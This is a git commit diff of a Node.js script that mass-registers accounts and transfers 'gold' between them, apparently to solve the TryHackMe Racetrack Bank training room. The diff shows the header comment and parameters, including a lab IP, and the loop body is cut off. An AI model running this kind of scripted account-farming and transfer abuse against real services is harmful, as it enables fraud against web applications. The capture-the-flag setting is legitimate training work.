acaa90a2380db4ec7d53ea7406c378ad95f3d809
Wapzzz <91371533+Wapzzz@users.noreply.github.com>
2021-09-27 11:36:52 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,10 +1,22 @@
+/* 
+
+TryHackMe Racetrack Bank room gold generator.
+If it starts glitching out, change the secUser
+value to any value without numbers at its end.
+
+*/
+
+
+
+
 const request = require('request');
 
 // Options
 
-let user = 'USERNAME'; // User to send the gold too, should be already registered
-let pass = 'PASSWORD'; // Password you want the users to have
-let host = 'HOST'; // Your machine ip
+let user = 'hell'; // User to send the gold too, should be already registered
+let secUser = 'secuser'; // Else accounts
+let pass = '1'; // Password you want the users to have
+let host = '10.10.33.89'; // Your machine ip
 let sCode; // Leave that empty
 
 let cookies; // Leave that blank
@@ -13,8 +25,8 @@ let gold = 10100; // How much gold to add
 
 for(let i=1; i<gold; i++) {
 
-    let rdata = `username=teddd${i}&password=${pass}&password2=${pass}`; // Register data
-    let ldata = `username=teddd${i}&password=${pass}`; // Login data
+    let rdata = `username=${secUser}${i}&password=${pass}&password2=${pass}`; // Register data
+    let ldata = `username=${secUser}${i}&password=${pass}`; // Login data
     let sdata = `user=${user}&amount=1`; // Send-Gold data
 
     if(i<2000) {
